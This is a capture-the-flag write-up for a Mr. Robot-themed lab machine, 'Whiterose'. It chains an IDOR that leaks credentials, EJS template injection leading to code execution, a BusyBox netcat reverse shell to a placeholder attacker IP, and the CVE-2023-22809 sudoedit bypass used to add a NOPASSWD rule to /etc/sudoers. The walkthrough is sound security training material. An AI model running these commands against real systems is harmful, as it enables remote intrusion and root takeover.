# Whiterose

## Challenge Overview

A Mr. Robot-inspired machine based on the episode "409 Conflict". We are given initial credentials upfront:

```
Olivia Cortez : olivi8
```

The goal is to find Tyrell Wellick's phone number, then escalate to full root access.

---

## Exploitation

### Step 1 — Add the Domain to /etc/hosts

The site fails to load until we map the domain:

```bash
sudo nano /etc/hosts
# Add:
<MACHINE_IP>  cyprusbank.thm
```

The page loads but shows a maintenance message — no directories found via Gobuster.

### Step 2 — Subdomain Enumeration

Directory busting found nothing, so we fuzz for subdomains instead:

```bash
wfuzz -w subdomains-top1million-110000.txt \
  -u http://cyprusbank.thm/ \
  -H 'Host: FUZZ.cyprusbank.thm' \
  --hc 400,404 --hh 57 -t 150 -c
```

✅ Subdomain found: **`admin.cyprusbank.thm`**

Add it to `/etc/hosts` and navigate to `http://admin.cyprusbank.thm/login`.

### Step 3 — Log In as Olivia

Using the provided credentials we log in successfully. We can see customer names but not phone numbers — Olivia has limited privileges.

### Step 4 — IDOR on the Messages Page

The messages page URL contains a parameter:

```
http://admin.cyprusbank.thm/messages/?c=5
```

Changing it to `c=0` reveals an older chat log containing leaked credentials:

```
Gayle Bev : p~]P@5!6;rs558:q
```

### Step 5 — Log In as Gayle

Gayle has higher privileges — logging in reveals the full customer table including phone numbers.

```
Tyrell Wellick    $20,855,900,000    842-029-5701
```

✅ **Phone number: `842-029-5701`**

### Step 6 — SSTI via the Settings Page

The Settings page updates customer passwords. Removing the `password` parameter from the request causes a server error revealing:

```
ReferenceError: /home/web/app/views/settings.ejs
```

EJS (Embedded JavaScript Templates) is vulnerable to **Server-Side Template Injection (SSTI)**. Using the known CVE payload appended to the `name` parameter in Burp Suite, we confirm RCE:

```
settings.ejs payload → executes whoami → returns "web"
```

### Step 7 — Reverse Shell

We use BusyBox Netcat (standard `nc -e` was unavailable) to get a shell:

```bash
# Attacker machine
nc -nlvp 4444

# Payload in Burp Suite (name parameter)
busybox nc <ATTACKER_IP> 4444 -e /bin/bash
```

Shell received. Stabilise it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# type: reset
```

### Step 8 — user.txt

Navigating one directory back from the web root:

```bash
cat ~/user.txt
```

🏁 `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`

### Step 9 — Privilege Escalation via CVE-2023-22809 (Sudoedit Bypass)

Checking sudo permissions:

```bash
sudo -l
# (root) sudoedit /home/web/app/views/settings.ejs
```

We can `sudoedit` the settings file as root. Using **CVE-2023-22809**, we exploit the `EDITOR` environment variable to trick `sudoedit` into opening a different file:

```bash
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /home/web/app/views/settings.ejs
```

This opens `/etc/sudoers` as root. We add:

```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

Save and exit, then:

```bash
sudo bash
```

✅ Root shell obtained.

### Step 10 — root.txt

```bash
cat /root/root.txt
```

🏁 

---

## Key Takeaways

> **IDOR** on the `?c=` parameter exposed credentials that escalated our privileges from a limited user to an admin.

> **SSTI in EJS** allowed us to go from web app access to remote code execution on the server.

> **CVE-2023-22809** (Sudoedit bypass) let us edit `/etc/sudoers` as root by injecting a secondary file path through the `EDITOR` environment variable — a chained vulnerability that demonstrates why keeping dependencies updated is critical.
```
